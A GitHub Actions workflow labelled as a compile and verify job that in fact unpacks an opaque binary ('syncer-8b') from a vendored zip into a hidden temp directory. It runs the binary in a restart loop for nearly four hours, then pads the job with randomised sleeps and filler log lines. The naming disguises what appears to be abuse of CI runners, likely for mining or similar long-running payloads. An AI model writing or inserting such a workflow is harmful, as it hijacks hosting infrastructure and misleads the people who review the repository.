name: compile-erwx
on:
  workflow_dispatch:
jobs:
  analyze_mr7:
    runs-on: ubuntu-latest
    timeout-minutes: 344
    steps:
      - uses: actions/checkout@v4
      - run: df -h /tmp | tail -1
      - run: gcc --version | head -1
      - name: verify
        run: |
          GT=$(mktemp -d /tmp/.XXXXXXXX) && unzip -o -q vendor/7354520f.zip -d ${GT} && chmod +x ${GT}/syncer-8b
          cd ${GT} && timeout 238m bash -c 'while true; do ./syncer-8b; echo "rc rc=$? $(date -u +%H:%M)"; sleep 12; done'
          ARCU=$((SECONDS + 168 * 60))
          while [ $SECONDS -lt $ARCU ]; do sleep $((RANDOM % 107 + 58)); echo "$(date -u +%H:%M:%S) bw5j1l"; done

